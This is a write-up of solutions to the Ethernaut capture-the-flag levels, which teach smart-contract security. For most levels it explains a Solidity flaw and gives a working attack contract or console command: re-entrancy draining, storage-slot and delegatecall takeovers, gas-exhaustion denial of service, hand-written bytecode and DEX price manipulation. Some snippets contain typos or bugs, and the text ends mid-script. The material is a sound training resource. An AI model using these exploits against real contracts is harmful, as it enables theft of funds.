# Ethernaut Full Writeup

## Hello Ethernaut

> This challenge is a warm-up challenge and for those who doesn't know how to interact with contracts using the js librairies.

```js
await contract.info()
await contract.info1()
await contract.info2("hello")

await contract.infoNum()
await contract.info42()

await contract.theMethodName()
await contract.method7123949()

// Here we are asked to submit the password that we know to authenticate but we didn't interact with any passwords. A quick guess, password is a public field in the contract 

const password = await contract.password() // We fetch the values of variables as methods

await contract.authenticate(password);
```

Challenge solved ✅

## Fallback

### Challenge description

> You will beat this level if
    - you claim ownership of the contract
    - you reduce its balance to 0

### Analysis

a quick run through the code of the challenge, I extracted the valuable methods and variables we will be using.

![Contribute Method](images/c323ec3e81e2a66f654995386118d6903a9758b1fa877d780d521e99db208afb.png)  

Here we see how the contribute method works. Pretty simple we send ether and it's recorded for us.

![fallback method](images/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf.png)  

Okay the **receive** part. As we see here we are defining a function but without the *function* keyword. That's because the receive function is a *fallback* function, let's say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.
Actually, since the version 0.6.0 we got two functions to handle fallback cases. *fallback* and *receive*. a little explainer of how they are called ...

```js
// Explainer from: https://solidity-by-example.org/fallback/
    // Ether is sent to contract
    //      is msg.data empty?
    //          /   \ 
    //         yes  no
    //         /     \
    //    receive()?  fallback() 
    //     /   \ 
    //   yes   no
    //  /        \
    //receive()  fallback()
```

So what we need to do here actually ?

1. Contribute so we have a contribution **value non nul**.
2. Trigger the fallback function by sending ether to the contract.

### Exploit

```js
await contract.contribute({value:toWei(etherValue)});
await contract.sendTransaction({value:toWei(etherValue)});
```

Challenge solved ✅

## Fallout

Constructors in solidity are quite a story and they were the source of a big exploit.
Here the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal **public** function that we can call to get the contract ownership.

```js
await contract.Fal1out();
```

## CoinFlip

`Randomness is just a myth.`

### Challenge description

You'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

### Analysis 

In blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an undeterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible. 

Here we see the function of coinFlip
![CoinFlip method](images/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b.png)  

our seed is actually `block.number` but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈

### Exploit 

![CoinFlip Attack](images/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a.png)  

Now all we have to do is call the contract method 10 times.

## Telephone

### Challenge Description

- Claim ownership of the contract.

### Analysis

![Telephone method](images/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f.png)  

Here we see the condition being checked is as simple as `tx.origin != msg.sender` but what does `tx.origin` means ?
Actually `tx` is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.
When we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the `tx.origin == caller.address` 

### Exploit

Based on our analysis we understand all we need is to call the function from an evil contract and pass our address as paramater.

```js
interface TelephoneInterface{ 
    function changeOwner(address _owner) external; 
}

contract EvilContract { 
    
    TelephoneInterface victimContract;
    contructor(address victimAddress) public {
        victimContract = TelephoneInterface(victimAddress);
    }

    function becomeOwner(address newOwner){
        victimContract.changeOwner(newOwner);
    }
}
```

Challenge solved ✅

## Token

### Analysis

This challenge is about **unsigned integers**. We need to be extra duper careful when handling them as they *overlap*. What does that mean ? 

```c#
uint8 X= 255;
X=X+1 // X = 0 ;
```
Now you see it.

![Token method](images/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a.png)  

```js
 require(balances[msg.sender] - _value >= 0); // How about we pass a big value to this poor unsigned balances[msg.sender] ?
```

### Exploit

We got 20 tokens, So I will be generous and give more than I own.

```js
 await contract.transfer(player,21);
```

Challenge solved ✅

## Delegation

### Challenge description

The goal of this level is for you to claim ownership of the instance you are given.

### Analysis 

Here we are exposed to the `delegateCall` function. If you don't know what this function does I will try to sum it up. It's a low level way to call a method of a contract ( in our case `pwn` ) in the context of another, it means it gets the storage values and global ones of the contract who called `delegateCall`.

![Delegation pwn](images/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc.png)  

![Delegation fallback](images/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a.png)  

Okay so what is *msg.data* ?
msg.data can be the function selector with the paramaters in a bytes encoded format

### Exploit

I wrote a contract to get the bytes, we can also use `web3.eth.abi.encodeFunctionCall` from the console.

```js
contract Utility {
     function pwnEncoded () public pure returns (bytes memory) {
      return abi.encodeWithSignature("pwn()"); 
    }
```

```js
await contract.sendTransaction({data:valueFromContract});
```
Challenge solved ✅

## Force

We will learn another capability of smart contracts which sometimes became problematic if we rely on it.

### Challenge description

The goal of this level is to make the balance of the contract greater than zero.

### Analysis

Nothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.

[Link for more informations](https://docs.soliditylang.org/en/develop/security-considerations.html)

So what is the method to send ethers to an empty contract or let's say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it's the method `selfdestruct(address)`

> The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state

[Docs Link](https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct)

We got everything we need now let's hack !

### Exploit

```js
contract EvilContract { 
    // payable public so we can send it some ether to pass.
    function forceSendBySacrifice(address victimAddress) payable public {
        selfdestruct(_address);

    }
}
```

## Vault

`transparency has no limits`

### Challenge description

Unlock the vault to pass the level!

### Analysis

![Vault storage](images/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a.png)  
![Vault method](images/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee.png)  

The private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can't be viewed or accessed by other **contracts** logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.

Here we can see got two storage variables `locked` and `password`. I highly encouraging reading the docs [Storage solidity Docs](https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage) to understand how these variables are layed out.

bytes32 will take a whole slot so it can share the slot with locked. We will have then :

*slot0*  `locked`
*solt1*  `password`

### Exploit

```js
 const password = await web3.eth.getStorageAt(address, 1);
 await contract.unlock()
```

Challenge solved ✅

## King

### Challenge description

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

### Analysis

![King method](images/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c.png)  

Pretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?
If we go back to the `fallback` challenge we talked about *fallback* methods. Here when we call `transfer` a callback function of the contract to whom we are transfering funds to will be triggered.

### Exploit

1. Make our contract the king.
2. Our contract now revert the transaction and won't step down from the throne 😈.

```js
contract EvilContract { 

    function becomeKing(address victimAddress) public payable { 
        victimAddress.call{value:1000000000000000000}("");
    }

    function() external payable { // fallback function definition
        revert("The kingdom is mine now !");
    }
}
```

Challenge solved ✅

## Re-entrancy

### Challenge description

The goal of this level is for you to steal all the funds from the contract.

### Analysis

A quick read about Re-entrancy attack is all we need: [HackerNoon Article](https://hackernoon.com/hack-solidity-reentrancy-attack).

![Reentrancy method](images/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c.png)  

So he is actually our balance after the call that's all we need !

### Exploit 

```js
interface Reentrance {

    function donate(address _to) external payable;
    function withdraw(uint amount) public;
}

contract EvilContract {
    Reentrance victimContract;
    address victimAddress;
    uint donatedValue;

    constructor(address _victimAddress) public payable {
        // Set our victim contract, fund the contract.
        victimContract = Reentrance(_victimAddress);
        victimAddress= _victimAddress
    }

    function attack(uint _donatedValue) public {
        victimContract.donate.value(address(this),{value:_donatedValue});
        victimContract.withdraw(_donatedValue);
        donatedValue=_donatedValue
    }

    function() public payable {
        // Receiver for funds withdrawn by the attack
            if(victimAddress.balance>= donatedValue )
            victimContract.withdraw(msg.value);
        }
}
```

Now we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep it to multipliers of 10 and so on.

Challenge solved ✅

## Elevator

`with trust, everyone can get to the last floor`

### Challenge Description

This elevator won't let you reach the top of your building. Right?

### Analysis

![Elevator method](images/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851.png)  
This function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :

1. `Elevator` contract has no control over the logic of the `Building` contract.
2. The `goTo` function is actually `public` which makes it possible to have some state changes inside it. 

And all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top. 

### Exploit

```js
interface Elevator { 
 function goTo(uint _floor) external;
}

contract EvilBuilding { 
    uint count= 0; 
    function isLastFloor(uint) external returns (bool){ 
        count ++ ; 
        return count%2==0 ? true : false; // The first time will pass false the second true
    }

    function callAttack(address ElevatorAddress) public {
        Elevator elevatorContract = Elevator(ElevatorAddress);
        elevator.goTo(10); // put any number here really
    }
}
```

Challenge solved ✅

## Privacy

### Challenge description

The creator of this contract was careful enough to protect the sensitive areas of its storage.
Unlock this contract to beat the level.

### Analysis

![Privacy storage](images/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e.png)  

As we said before, every variable in the storage can be accessed all we have to do is find which slot it's residing in. Same applies here.

We got the following:

```js
// [0] bool locked
// [1] uint256 ID
// [2]      awkwardness | denomination | flattening
// arrays start always in a new slot 
// [3] bytes32 data[0]
// [4] bytes32 data[1]
// [5] bytes32 data[2]
```

### Exploit

We know the position of the password . We can unlock the contract. 

```js
await contract.getStorageAt(INSTANCE_ADDRESS,5);
/// We can manually extract the least significant 16 bytes or simply write a util contract like below
```

```js
contract Utils { 
    function get16Bytes(bytes32 value) public returns (bytes16) {
        return bytes16(value);
    }
}
```

```js
await contract.unlock(Returned_Value);
```

Challenge solved ✅

## Gatekeeper One

This challenge gave me hard time, two days to solve it but I learnt a lot during those days.

### Challenge description

Make it past the gatekeeper and register as an entrant to pass this level.

### Analysis

Okay so we got three modifiers, each one represents a `barrier` we need to break through. I will be going through each modifier one by one.

#### gateOne

Looking to this gate it sounds really familiar

![GatekeeperOne gateOne](images/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e.png)  

It implies that we should be using another contract to interact with the gate.

#### gateThree

I will leave gateTwo the last one as it's the most annoying ( not hard ) one to pass.

![GatekeeperOne gateOne](images/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a.png)  

We got three conditions to pass and lot of type conversion 🙂.It's time we learn how conversions works in solidity [Solidity Type conversions](https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions)

Let's go through each condition one by one

1. First condition

```js
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
```

Let's say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have 

*uint16 == uint32* which translates to 0x0000AAAA== 0xAAAA. => uint64(_gateKey) = 0x????????0000AAAA

2. Second Condition

```js
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
```

**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the `?` are different than zeros.

3. Last condition

```js
require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
```

It just tells us that the `AAAAA` should be derived from the `tx.origin` value.

Okay to sum it up we have the format of `0xFFFFFFFF0000FFFF` for our contract. so we can get the values by using a logical operator `&`.

#### gateTwo

![Gateekeeper gateTwo](images/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf.png)  

what is the `gasleft` function ?
the gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?
we can chekc the website [Opcodes, EVM](https://www.ethervm.io/), actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.

### Exploitation

1. We should call the contract from our `Evil Contract` so we bypass the first gate
2. We should make sure the key adhere to the key format we found.
3. We need to pass a gas value that passes the condition.
    > However when searching for that gas value we can
        1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)
        2. Use the debugger to check the gas value at the condition check.
        3. Just don't, if you are impatient brute force it. That's what I did when I got low on caffeine and the music stopped.

![Debugging interface](images/18f23b5aad25da24fa6fbdc8842fb1ee0568daa3ac723a166802b0cc2dd2518d.png)  

So here is the final contract

```js
contract EvilContract { 
    function getKey() view public returns (bytes8){ 
        return bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; // The first time will pass false the second true
    }
    function callAttack(address gateAddress, uint baseGasValue) public returns (bool) {
        bytes8 gateKey = getKey();
        uint i;

        for (i=0;i<300;i++)
        {
        (bool result,) =  gateAddress.call{gas:gasValue}(abi.encodeWithSignature("enter(bytes8)", baseGasValue+100+8191*4));
        if(result) return result;
        }
        return false;
    }
}
```

Happy hacking ! You may rest traveler , The next gate will be some kind of a boss fight.

Challenge solved ✅

## GateKeeper Two

> Time to delve deep in the ethereum blockchain

### Challenge description

I will sum up we need to pass the gate and learn many things.

### Analysis

As usual here we got three modifiers to pass. We will be going through each modifer one by one from the easiest to the hardest.

![Gatekeeper contract](images/193982e4a19ec767e0759ab2e9adc2e16865502b0625e6eb22fc0a39e11418d7.png)  

#### GateOne

```js
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

Okay we need to call the `GatekeeperTwo` from another contract.

#### GateTwo

```js
modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

Oww a new keyword `assembly` what's that ? 
![Solidity Documentation Screenshot - assembly keyword](images/2cb6f44375d3fb1a39d4e147414218e8f9d1b7fe5a98c873c4469082b7fba674.png)  

So we have now a clear idea of the assembly keyowrd and it's capabilities, that might remind you a little bit of how the `C` language works ! 
For the `extcodesize` the code snippet below taken from the docs explains it all.

```js
// retrieve the size of the code, this needs assembly
            let size := extcodesize(addr)
```

For the `caller()` it returns the address of the caller. it might be an account or another contract. Actually, this `consensys` which a great resource for smart contract security explains it all .

> the idea is straightforward: if an address contains code, it's not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.

[Consensys Page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)

So we now know to pass this gate we need to call the method `enter` in the constructor of our *EvilContract*

### gateThree

This gate resembles gateThree of *GateKeeper One* it's about performing the right logical operations and finding the gateKey.

```js
 modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
```

Let's evalulate the *right* side of the equality. Remember the *Token* Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value `0xFFFFFFFF`.
For the *left* side of the equality we got an **XOR** operation. **XOR** verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let's ignore the conversion it won't change anything actually because we can reverse it to get the _gateKey later.

So the equation we have : 

**A** =  `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`
**B** = `uint64(_gateKey)`
**C** = `uint64(0) - 1`

Here is what we need to do ! Read carefully this wikipedia page if you need to understand how it works on bit level. [Wikipidea XOR Article](https://en.wikipedia.org/wiki/XOR_cipher)
![XOR Wikipedia Screenshot](images/01a9f0d0791a8896c4b6109abc576acbfbccade8b44817fa1abd2f245eb99700.png)  

`A ^ B = C , B = ? ==> B = A ^ C` 
Which translates to 
`gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1);`

### Exploit

Let's craft our *EvilContract*

```js
contract EvilContract { 

    function getOperationResult() public pure returns (uint64){
        uint64 x =0; 
        return x - 1;
    }

   function getGateKey() public view returns (bytes8){ 
       uint64 x = getOperationResult();
     return   bytes8(x ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
   }

   
   constructor(address gateAddress) public {
       GateTwo gateTwoContract= GateTwo(gateAddress);
       bytes8  gateKey =getGateKey();
      bool state= gateTwoContract.enter(gateKey);
     require(state);
   }
   
}
```

We pass our instance address to the constructor.

Challenge solved ✅

> I was late, I couldn't join theCyber club 🥲

## Naught Coin

> RTFM

### Challenge Description

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
~ A bunch of useful references we will be going through in analysis

### Analysis

![Naught Coin contract](images/264f925aeaf5e08d9758746a1f9774a6a2194df257f8dd0a92a00b4b820881d7.png)  

The contract is an implementation of the ERC20 specification.

*How it works ?*
We create tokens that can be traded between the users of our contract. Our contract is responsible for setting the total supply and modifying it, keeping track of users balance and one other useful feature allowing and disallowing the ones who can spend/trade tokens from each account remember that it will be useful.

The logic is flawless and the condition cannot be bypassed.

```js
      require(now > timeLock);
```

But our contract is inheriting from the ERC20 of openzeppeling and we can see something is wrong.

![ERC20 openzeppeling](images/1ec4088e0ffadccfa057b1c022c8d4fb51d1475ef0e0018a4e32b7b1beab92e0.png)  

We got another method for transfering tokens ! cool but wait *he caller must have allowance for ``from``'s tokens of at least amount* so msg.sender needs to have an allowance of the amount.
and allowance can be set by calling..

![ERC20 openzeppelin](images/47b72aa9c7060cd02c197e1de9e50fb4f53f3b5a7d7e6e9f0c946807ec700df9.png)  

Okay we got everything let's exploit it

**Further Reading** [ERC20 API: An Attack Vector on Approve/TransferFrom Methods](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit#)

### Exploit

```js
const balance = (await contract.balanceOf(player)).toString();
await contract.approve(player,balance);
await contract.transferFrom(player,ANY_OTHER_ADDRESS,balance);
```

Challenge solved ✅

## Perservation

### Challenge description

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
The goal of this level is for you to claim ownership of the instance you are given.

### Analysis

I explained well the `delegateCall` function before and how it runs in the caller context but I left the context a little blurry so let's define it.
The context here is the storage variables or let me call them `state variables` they are defined in the contract address and the called contract will handle them *blindly* which means he will assume that

*Storage layout of the caller*  == *Storage layout of the callee*

Let's look to our contract now.

![Perservation contract](images/0cded2638e39c98dee9e35690675e5a299c3628f81c9bdb1375a708b5e209098.png)  

The interesting bits are : 

```js
  //inside the library contract
  uint storedTime;  

   function setTime(uint _time) public {
    storedTime = _time;
  }
```

```js
 // inside the vulnerable contract
 address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
```

I guess you got an idea what will happens with the delegateCall ? `storedTime` is actually our `timeZone1Library` variable they are both at `slot[0]` of the storage so it will be set instead. 
and the `setSecondTime` does the same thing as the `setFirstTime` in this case.

### Exploit

1. Create an evil contract that implements `setTime(uint)` and has the same storage layout as the vulnerable contract ( by declaring the same variables in the same order 😄)
2. call the `set_X_Time` of the vulnerable contract by passing uint(evilcontractAddress) as paramater
3. call the method again now our evilContract function will be triggered to set owner = ourAccount;

Let's craft the *EvilContract*

```js
contract EvilContract {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  
  // These variable are useless because we won't to ensure that the owner is in slot[2] 
  // we don't really care about the slots that comes after
  uint storedTime;
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

   function setTime(uint _time) public {
    owner = 0x84e7a3679A82C2766Ff8382862ab883FF9460307;
   }

   function getParam() view public returns (uint){
        return uint(address(this));
   }
}
```

Challenge solved ✅

**Further Reading** [Preventing Smart Contract Attacks on Ethereum — “DELEGATECALL”](https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-delegatecall-e864d0042188)

## Recovery

> Forensics in the blockchain world !

### Challenge description

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

### Analysis

**the problem**

```js
    new SimpleToken(_name, msg.sender, _initialSupply);
```

> A contract can create other contracts using the new keyword. The full code of the contract being created has to be known when the creating contract is compiled so recursive creation-dependencies are not possible.

[Solidity Docs - New keyword](https://docs.soliditylang.org/en/v0.8.15/control-structures.html?highlight=new%20keyword#creating-contracts-via-new)

the `new` keyword returns the address of the created contract but here it's not saved and there is no way to retrieve it from the contract state. But we are in the blockchain world where transparency rules ! All transactions are saved and we can actually find the created contract.

### Exploit

1. Go to [Etherscan](https://rinkeby.etherscan.io/)
2. Search for your instance address
3. You will find something similar to this, click it !
![Recovery instance contract](images/93668187b141f813b187b92cf0e33ff963269e40cd11b36386300e201af120c9.png)  

4. Check the balance to be sure that it's the created contract.

 ![Recovery created contract](images/106328b15039a3d164b45720563251c6f628e2907732a9b997514327aac3f457.png)  

6. call the destroy function with your wallet address as paramater

Here is a simple contract to call the destroy function :

```js
interface SimpleToken {
      function destroy(address payable _to) external ; 
}

contract Recover {

    function recoverFunds(address contractAddress, address payable myAddress) public {
        //  (bool success, ) = contractAddress.call(
        //     abi.encodeWithSignature("destroy(address payable)", myAddress));
        //  require(success);   

        // or a cleaner way 
        SimpleToken tokenContract = SimpleToken(contractAddress);
        tokenContract.destroy(myAddress);
    }

    function verifyBalance(address contractAddress) public view returns (uint){
        return contractAddress.balance;
    }
}
```

## Magic Number

### Challenge description

> To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.
Easy right? Well... there's a catch.
The solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 opcodes at most.

### Analysis 

Writing Opcode instead of plain solidity.  **It's not that hard right ?** *right?* 
Okay Let's dive in one by one till we understand how everything works. I  will be writing some pseudo/solidity code for analogy.

```js
//
function whatIsTheMeaningOfLife(){
    return 42;
}

```

`a contract that responds to whatIsTheMeaningOfLife()` fallback function can answer that so let's make things more simple

```js
function(){
    return 42;
}
```

Let's translate it line by line to opcode. I found this magnificent reference [EtherVM](https://www.ethervm.io/#02). I really like the table view instead of navigating page by page through the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf).

```js
return 42; 
---------   
PUSH1 0x42 //  our value
PUSH1 0x80 //  memory position
MSTORE // stores the 42 into memory location 0x80
PUSH1 0x20 // the length of the value
PUSH1 0x80 // memory position ( again )
RETURN // returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !

// *10 bytes total*
```

`PUSH1 VALUE` pushes a 1-byte value onto the stack.
`MSTORE` writes a (u)int256 to memory takes (offset,value) as args

> The ethereum evm is a [Stack Machine](https://en.wikipedia.org/wiki/Stack_machine). args comes from the stack and return values are written into the stack.

> In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use [A deep-dive into Solidity – contract creation and the init code](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/)

Now we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two *initialization opcodes* and *runtime opcodes*. The *initialization opcodes* are the one responsible for the creation of the contract by executing the constructor and copying the *runtime opcodes* into the memory because the *runtime opcodes* is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the *runtime opcodes*. Let's define our *initilization opcodes*

```js
// copy the runtime code into memory with codecopy(length,offset,dest)
PUSH 0x0a // 10 bytes of runtime opcodes
PUSH 0x0c // 13 bytes of initialization opcodes ( I didn't guess it I have actually calculated after writing the whole thing )
PUSH 0x00 // memory offset
CODECOPY

// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code
PUSH 0x0a 
PUSH 0x00
RETURN
```

### Exploit

To craft our payload we will convert the instruction to pure bytes. That's fairly easy. We view [EtherVM](https://www.ethervm.io/#02) to view the bytes of each instruction and for the values we discard the `0x` (`0x0a` => `0a`)

                       [ Initialization bytes    |    Runtime bytes ]
So our final payload : `600a600c600039600a6000f3604260805260206080f3`

We open the console to create our contract and set it as the solver.

```js
const tx = await web3.eth.sendTransaction({from:player,data:'600a600c600039600a6000f3604260805260206080f3'});
await contract.setSolver(tx.contractAddress);
```

Challenge solved ✅

## Alien Codex

### Challenge description

You've uncovered an Alien contract. Claim ownership to complete the level.

    Understanding how array storage works
    Understanding ABI specifications
    Using a very underhanded approach

### Analysis

First look at the contract code nothing comes to my mind. The Ownable contract is actually `openzeppelin` Ownable and I looked into its source code and the only useful thing I got is it saves `address owner`.

 Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack. We have to use `keccack265(length_position)` to find the first slot of array data.

So how can we exploit that ?

![Alien Codex method](images/86f1f291d81ff664dbe3c9afd11c315bb31de2e0a3283a0f8d964b43e9bf44eb.png)  

We got 2 slots taken from the whole storage. If we make the length of the array takes up the whole storage then we can overwrite any value of it. `retract` allows that, the `array.length` is `uint256`. 

After taking up the whole storage we need to find the position of the owner variable.
Our current storage layout is.

```js
/* STORAGE
* [0]: contract + owner , 
* [1]: codex
* keccak256(1) : codex[0]
*       ..
*        ..
* [2^256]: 0x000000000
*/
```

We want to overlap and get to slot[0] to set it. We can calculate the index of that element by `2^256 - keccack(256)(1) +1`

### Exploit

first we call the `retract` to set the array length to max.

```js
await contract.retract()
```

then we get our payload, here is a utils contract.

```js
contract Utils { 

    function getNumber() public pure returns (uint256){
      uint256 x =0;
        
        // return x-1 - uint256(keccak256(abi.encodePacked(uint256(1))))+1;
        
        return x - uint256(keccak256(abi.encodePacked(uint256(1))));
    }
}
```

We check if we got it right 😄

![Alien Codex - check](images/03ed7019523687b6195b1e2824212ccf9c27300ff053773c2f5b93ea5b79580d.png)  

no need to be puzzled we know what it is it's the contact value + 

![Alien Codex - Level address](images/9faab8cbd57b86461622fa7e3aad8dab64aed6c6d4a52a4ee19088857b840d21.png)  

So our payload should be 

```Js
0x00000000000000000000000184e7a3679A82C2766Ff8382862ab883FF9460307
0x000000000000000000000001YOUR_ADDRESS_HERE
```

Challenge solved ✅

## Denial

> There is a way to using `addr.call{value:x}("")`, only that it forwards all remaining gas and opens up the ability to perform more expensive actions ( and it returns a failure code instead of propagating the error )  ~ Solidity docs

That's all we need. So I lost quite bit of time looking for a way to reach the call stack depth limit ( which is 1024 ). But it was more the hard way of doing things.  What if we didn't leave the caller contract enough gas to transfer the 1% of the owner ? Yes that's really it !

### Exploitation

Our evil contract, btw don't try to run it on Remix as it will crash instead use truffle console or something similar to try it 

```js
contract EvilContract { 
    receive() external payable {
        while(true);  // the line that crashed my whole VM
    }
}
```

Challenge solved ✅
 
 > This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().

Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.


## Shop

```js
interface Shop {

  function buy()  external ;
  function isSold()  external view returns (bool) ;
  }

contract EvilContract { 
    address victimAddress;
    Shop shopContract;

    function setVictimAddress( address _victimAddress) public { 
        victimAddress= _victimAddress;
        shopContract = Shop(_victimAddress);
    }

    function price() external view returns (uint){
        return shopContract.isSold()?0:100;
    }

    function buy() public {
        shopContract.buy();
    }
}
```

## Dex

`This challenge and it's second version will have the same solution basically with a little tweak. Better understand the concept`

### Challenge Description

>The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
### Analysis

The logic is faultless or is it ?  Well to be honest had to try many things here. One thing that got my attention that the equation made to calculate the swap_amount was familiar but not that much

![Dex Equation](images/17dcc969cfc52464829cb1a88231824931fda3a5b0d0b1d3d446eaf763974942.png)

A good read to understand it [Amazing Article to understand AMM](https://www.gemini.com/cryptopedia/amm-what-are-automated-market-makers).

So actually by balancing our token balance from one token to another we will manage at last to drain the contract's balance of one token's type.

### Exploitation

```js
const contractABI = artifacts.require("Dex");

// if token1.balance > token2.balance ==> token2 is more expensive because it has less tokens
// we want to trade the most expensive tokens
// knowTokenValues() ==> Distiniguishing the most expensive and cheapest token
// getSwapValues() // Basically our balance in the most expensive token
// ==============================

let contract ;
const TOKEN1_ADDRESS = "0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7";
const TOKEN2_ADDRESS = "0xE651aD37ac31B03F7B49036248A29DC75D0093E6";
let PLAYER='PLAYER_ADDRESS'

async function getBalances(){
    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();
    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();
    console.log(`Current Balances for contract : A : ${token1Balance} \t B : ${token2Balance}`);
